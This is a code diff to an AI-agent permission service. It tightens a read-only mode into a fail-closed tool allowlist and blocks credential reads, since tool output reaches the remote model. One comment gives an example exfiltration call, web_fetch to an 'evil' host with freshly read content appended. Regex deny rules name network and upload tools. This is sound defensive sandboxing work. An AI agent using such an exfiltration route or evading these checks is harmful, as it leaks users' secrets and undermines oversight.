@@ -19,7 +19,7 @@ import {
   protectedTargetsForMode,
   type PermissionMode,
 } from "./access-policy";
-import { bindExecutionOwner, createExecutionContext, LEGACY_PERMISSION_MODE_ALIASES, type ExecutionContext } from "./execution-context";
+import { bindExecutionOwner, createExecutionContext, normalizePermissionMode, type ExecutionContext } from "./execution-context";
 
 type PermissionBehavior = "allow" | "deny";
 type PermissionUpdateDestination = "userSettings" | "projectSettings" | "localSettings" | "session" | "cliArg";
@@ -98,12 +98,16 @@ export class AgentPermissionService {
       const name = toolName.toLowerCase();
       const explicitPaths = extractExplicitPaths(input);
 
-      // 只读档：**读自由、其余一律拒绝**（2026-09-17 用户拍板）。
-      // 保证是**结构性**的——整个执行面被移除 ⇒ 没有进程能发起网络请求 ⇒ 读到敏感内容也送不出去；
-      // 正因如此这一档**放行**读凭据（与标准档相反）。但必须同时挡住联网工具与 MCP（见 readonlyDenyReason）。
+      // 只读档使用纯读白名单，未知工具默认拒绝；不能靠“新增危险工具时记得补黑名单”。
+      // 高敏凭据仍禁止读取：工具结果会进入远程模型上下文，模型 API 本身就是外发通道。
       if (mode === "readonly") {
         const blocked = readonlyDenyReason(name);
         if (blocked) return deny("readonly.blocked", blocked.operation, name, blocked.detail);
+        for (const requested of explicitPaths) {
+          if (pathHitsAny(requested, protectedCredentialPaths(), cwd)) {
+            return deny("core.credential_read", "read", requested, "只读模式也不读取高度敏感凭据（内容会进入模型上下文）");
+          }
+        }
         return allow();
       }
 
@@ -205,11 +209,7 @@ export class AgentPermissionService {
 
 export const permissionService = new AgentPermissionService();
 
-function normalizeMode(raw: string): PermissionMode {
-  if (raw === "full" || raw === "bypassPermissions") return "full";
-  // 旧值别名（"restricted"/"sandbox" 是只读档定名前用过的内部叫法）统一归一，见 execution-context。
-  return LEGACY_PERMISSION_MODE_ALIASES[raw] ?? (raw === "readonly" ? "readonly" : "standard");
-}
+const normalizeMode = normalizePermissionMode;
 
 /** 权限模式的中文名（拒绝消息里要显示人话）。 */
 export function permissionModeLabel(mode: PermissionMode): string {
@@ -235,22 +235,34 @@ function isShellTool(name: string): boolean {
  * 只读档必须挡掉它们，否则「读自由」会被 `web_fetch("https://evil/?x=" + 刚读到的内容)` 绕过，
  * 整档的安全保证被抵消。（`mcp__*` 同理，另行拦。）
  */
-const NETWORK_TOOL_NAMES = new Set(["web_fetch", "web_search", "webfetch", "websearch"]);
+const READONLY_ALLOWED_TOOLS = new Set([
+  // 这些工具只走 Node 文件系统 API。grep / find / glob 在 Pi SDK 中可能按需下载 rg / fd，
+  // 不属于只读档可承诺的无写入、无联网路径。
+  "read", "ls",
+  // EasyMint 自身的纯查询工具；它们不启动进程、不写持久状态、不访问网络。
+  "list_issues", "list_agents", "read_agent_log", "search_experiences", "ask_user",
+  // 子 Agent 结构化返回工具；只在已存在的只读 worker 中出现。
+  "yield",
+]);
 
 /**
- * 只读档下应当拒绝的工具。返回 `null` = 放行（读类工具与无副作用的杂项工具）。
- *
- * ⚠️ **不变量**：这里必须覆盖**所有**带执行面/写入面/联网面的工具。
- * 新增此类工具时**必须同步登记**，否则会静默漏过——`__readonly.test.ts` 有清单守卫。
+ * 只读档的纯读白名单。返回 `null` = 明确允许；任何未知工具都 fail-closed。
+ * 这样新增工具必须先完成能力审查才可能进入只读档，不会因漏登记而静默获得写入/联网能力。
  */
 export function readonlyDenyReason(toolName: string): { operation: string; detail: string } | null {
   const name = toolName.toLowerCase();
-  if (isShellTool(name)) return { operation: "execute", detail: "只读档不执行任何命令（读自由，其余一律拒绝）" };
-  if (name === "install_dependency") return { operation: "execute", detail: "只读档不安装依赖（安装会执行包管理器的生命周期脚本）" };
-  if (isWriteTool(name)) return { operation: "write", detail: "只读档不写入文件" };
   if (name.startsWith("mcp__")) return { operation: "execute", detail: "只读档不启用 MCP 工具（会启动进程或联网）" };
-  if (NETWORK_TOOL_NAMES.has(name)) return { operation: "network", detail: "只读档不联网（联网工具可以作为外泄出口）" };
-  return null;
+  if (READONLY_ALLOWED_TOOLS.has(name)) return null;
+  if (isShellTool(name) || name === "install_dependency" || name === "task" || name === "stop_shell" || name === "stop_agent") {
+    return { operation: "execute", detail: "只读档不执行命令、启动子代理或控制进程" };
+  }
+  if (isWriteTool(name) || /(?:write|edit|create|delete|remove|update|set_|import|manage|learn|retire)/.test(name)) {
+    return { operation: "write", detail: "只读档不写入文件或修改应用状态" };
+  }
+  if (/(?:web|fetch|search|download|upload|describe_image)/.test(name)) {
+    return { operation: "network", detail: "只读档不调用可能联网或上传内容的工具" };
+  }
+  return { operation: "execute", detail: "该工具未声明为纯读能力，只读档默认拒绝" };
 }
 
 function extractExplicitPaths(input: Record<string, unknown>): string[] {
